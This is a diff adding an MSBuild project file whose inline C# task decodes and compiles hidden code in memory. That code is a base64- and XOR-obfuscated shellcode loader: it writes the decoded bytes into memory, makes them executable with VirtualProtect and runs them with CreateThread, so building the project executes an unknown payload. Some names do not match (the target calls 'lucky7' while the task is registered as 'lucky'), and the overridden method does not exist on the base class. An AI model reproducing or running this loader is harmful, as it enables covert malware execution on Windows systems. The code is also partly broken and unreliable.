@@ -1,0 +1,56 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="npscsharp">
+   <lucky7 />
+  </Target>
+  <UsingTask
+    TaskName="lucky"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+  <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Runtime.InteropServices;
+        using System.Collections.ObjectModel;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        using Microsoft.CSharp;
+        using System.CodeDom.Compiler;
+        using System.Reflection;
+
+        public class lucky7 : Task, ITask
+        {
+            public override bool MaryPoppins()
+            {
+                Console.WriteLine("hey");
+                string cmd = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5UZXh0OwpwdWJsaWMgY2xhc3MgQnJlYWtEb3duCnsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBNRU1fQ09NTUlUID0gMHgxMDAwOwogICAgcHJpdmF0ZSBzdGF0aWMgVUludDMyIFBBR0VfUkVBRFdSSVRFID0gMHgwNDsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBQQUdFX0VYRUNVVEVfUkVBRCA9IDB4MjA7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBWaXJ0dWFsQWxsb2MoVUludDMyIGxwU3RhcnRBZGRyLCBVSW50MzIgc2l6ZSwgVUludDMyIGZsQWxsb2NhdGlvblR5cGUsIFVJbnQzMiBmbFByb3RlY3QpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBhZGRyZXNzLCBVSW50MzIgc2l6ZSwgVUludDMyIG5ld1Byb3RlY3QsIG91dCBVSW50MzIgb2xkUHJvdGVjdCk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoCiAgICAgICAgVUludDMyIGxwVGhyZWFkQXR0cmlidXRlcywKICAgICAgICBVSW50MzIgZHdTdGFja1NpemUsCiAgICAgICAgVUludDMyIGxwU3RhcnRBZGRyZXNzLAogICAgICAgIEludFB0ciBwYXJhbSwKICAgICAgICBVSW50MzIgZHdDcmVhdGlvbkZsYWdzLAogICAgICAgIHJlZiBVSW50MzIgbHBUaHJlYWRJZAogICAgKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGhIYW5kbGUsIFVJbnQzMiBkd01pbGxpc2Vjb25kcyk7CiAgICBwdWJsaWMgdm9pZCBNYXJ5UG9wcGlucygpIHsKICAgICAgICBzdHJpbmcgcmF3ID0gQCJlUjRSQWlKMkxCRXlPbHd1S3laeUFEOXlDRVEvWURFTUNnWWtCUUpBZXkwaWNsUWdIQ2tCSENRVkFDa0ZkaVFqSWo1NkVpSVVlQ05pTlFOZ0FHVU1FaVorR1JzN09rWVBJeDFhQVFVQ0FXRURDQXdiS25ZbEJBSkRXUnRTUDBBaFB6a2FmeGMxSVRsTUFSY1NFUVFDQUI0L1dnd3lKUkIzTURjZmRnVmtQMkZlTlZzT01RWmhLV1p4S0g4U0ZBME5OSFVhRWx0SFFRY1BNbmc2UHhZWVdCd1hEQ002WVFFeFBoVWRKVDUwQ1FvL093VkJQQWRKTGdGYU8yQXFORnB4QnhJRkd3QUVJWDR5S0NFSlRBNDRLRmxDZkJZemRINC9Od2M1WkRNd0htNVNZU01FQ2hSOEZqTjNWMUpsRWdoeVlCWVRBeUoyTENZeEswSXdNQkpVR1RJNUxrUU9ZeGR4TEhGVUpRNGtDM1kwZHdFaUF4VWxSQTg3S2dvQmNTOEFPQjVST2p3c0FRY2JLSEJBQVR3aU96ZE5PeWsvTkVaM013MWZYaG9XSDNvWkZ5SUhNV01qR3pna1lBWUVLMllwQUFVYlp3dzZOaTB4Y0ZRV0RoNExjek4wZGpzMEJEMWdHQmNjRURvRkZRQTVIbFlrTW5WWURUVnpjRW9BRkQ0d01BVWpIeVFrZEJRb0xtcGROUVFoZnpkaUVIVTNjUUU5T1RaQ2N6Y3VRRDBES0QwRkd4a1FNUUYvQlNvOUpVSXNOQkpBT3pNb1BVVTFPZ3dLT21BL0lENURYamMwSFVBWUIzTWhjQUlWRTNJQWJ4MGhNU3R3T0FJUVNGZ0VLUWQ1R3pzNk5qbC9IU1l4UUZZMk1TOVRIQXdvSVFjTUt6STRBbG8vTVQwbFhna3pEWDFaTnkwSFd3QmpGRE11QmxSa09UVjBLaWdwWmhJWEJRdGNBR1VWSnh0QlFnWUNFR2dXQndSeEVtSUtHMmNEWURZWk5nWTNQMTFDWnpjcGFoODlPaTRtZUE1akVRQXVRQ3dSQWhad015UURjaG9lY2hOY01nUVpKQXRCUWdZK1Fud1dNM1JxQkJvU0VHb3pmbGNYQzFRdllTMDBXd3NqTW5FcU53WWRSQmcwUEc1U1lsUmhFUlphRHljRWNTbzNLQXRjRnhNNUFDSndDaEVxTm5NRE0zZFlNaVlGR1Y5NWFDOFZOZ1lpR2w1Q1ZpMG5CbkVxRndVSFpEY1RNeFlLVWlGL1dpcHFBd0lJR3ljVU5BRjNQakk2Y0ZaaEJ4UXpXRm93U1dvZlJCc1hJZ1lhT3pFNExHUlpLU1UzV1RjckVXVVJGdzgvUkNJd01oWUNVQzhFUkVwbmZ3PT0iOwogICAgICAgIGJ5dGVbXSBzaGVsbGNvZGUgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocGpsYWRkKCJWUXhBYzdtUGtzMkJmRTBrVkNJMyIsIEJhc2U2NERlY29kZShyYXcpKSk7CiAgICAgICAgVUludDMyIGZ1bmNBZGRyID0gVmlydHVhbEFsbG9jKDAsIChVSW50MzIpc2hlbGxjb2RlLkxlbmd0aCwgTUVNX0NPTU1JVCwgUEFHRV9SRUFEV1JJVEUpOwogICAgICAgIE1hcnNoYWwuQ29weShzaGVsbGNvZGUsIDAsIChJbnRQdHIpKGZ1bmNBZGRyKSwgc2hlbGxjb2RlLkxlbmd0aCk7CiAgICAgICAgVUludDMyIG9sZFByb3RlY3Q7CiAgICAgICAgVmlydHVhbFByb3RlY3QoKEludFB0cikoZnVuY0FkZHIpLCAoVUludDMyKXNoZWxsY29kZS5MZW5ndGgsIFBBR0VfRVhFQ1VURV9SRUFELCBvdXQgb2xkUHJvdGVjdCk7CiAgICAgICAgSW50UHRyIGhUaHJlYWQgPSBJbnRQdHIuWmVybzsKICAgICAgICBVSW50MzIgdGhyZWFkSWQgPSAwOwogICAgICAgIEludFB0ciBwaW5mbyA9IEludFB0ci5aZXJvOwogICAgICAgIGhUaHJlYWQgPSBDcmVhdGVUaHJlYWQoMCwgMCwgZnVuY0FkZHIsIHBpbmZvLCAwLCByZWYgdGhyZWFkSWQpOwogICAgICAgIFdhaXRGb3JTaW5nbGVPYmplY3QoaFRocmVhZCwgMHhGRkZGRkZGRik7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBzdHJpbmcgcGpsYWRkKHN0cmluZyBrZXksIHN0cmluZyBpbnB1dCkKICAgIHsKICAgICAgICBTdHJpbmdCdWlsZGVyIHNiID0gbmV3IFN0cmluZ0J1aWxkZXIoKTsKICAgICAgICBmb3IoaW50IGk9MDsgaSA8IGlucHV0Lkxlbmd0aDsgaSsrKQogICAgICAgICAgICBzYi5BcHBlbmQoKGNoYXIpKGlucHV0W2ldIF4ga2V5WyhpICUga2V5Lkxlbmd0aCldKSk7CiAgICAgICAgU3RyaW5nIHJlc3VsdCA9IHNiLlRvU3RyaW5nKCk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBCYXNlNjRFbmNvZGUoc3RyaW5nIHRleHQpIHsKICAgICAgIHJldHVybiBTeXN0ZW0uQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhTeXN0ZW0uVGV4dC5FbmNvZGluZy5VVEY4LkdldEJ5dGVzKHRleHQpKTsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBCYXNlNjREZWNvZGUoc3RyaW5nIGVuY29kZWR0ZXh0KSB7CgkgICAgcmV0dXJuIFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoZW5jb2RlZHRleHQpKTsKICAgIH0KfQ==";
+                CSharpCodeProvider lucky7 = new CSharpCodeProvider();
+                CompilerParameters parameters = new CompilerParameters();
+                parameters.ReferencedAssemblies.Add("System.dll");
+                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
+                parameters.GenerateExecutable = false;
+                parameters.GenerateInMemory = true;
+                parameters.IncludeDebugInformation = false;
+                CompilerResults results = lucky7.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
+                Assembly assembly = results.CompiledAssembly;
+                object obj = assembly.CreateInstance("BreakDown");
+                obj.GetType().InvokeMember("MaryPoppins", BindingFlags.InvokeMethod, null, obj, null);
+                return true;
+            }
+
+            public static string Base64Encode(string text) {
+               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
+            }
+
+            public static string Base64Decode(string encodedtext) {
+                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
